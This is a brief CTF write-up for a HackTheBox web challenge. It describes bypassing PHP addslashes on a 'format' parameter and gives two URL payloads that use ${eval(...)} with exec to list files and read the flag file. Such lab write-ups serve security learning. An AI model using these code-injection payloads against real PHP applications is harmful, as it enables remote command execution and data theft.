HackTheBox web challenge. I'm not good at web but took a shot at this one. It was quite interesting.

There was a vulnerable parameter `format` in the code but it was protected by `addslashes` php function. After some googling I found this article that helped me to bypass addslashes:

https://www.programmersought.com/article/30723400042/

I still spent some time trying to find correct way to display the flag. In the end query that worked was:

`?format=${eval($_GET[1])}&1=echo%20exec(%27ls%20-l%20..%20|grep%20flag%27);` - to find the flag file name

`?format=${eval($_GET[1])}&1=echo%20exec(%27cat%20../flagmR6OV%27);` - to display the flag
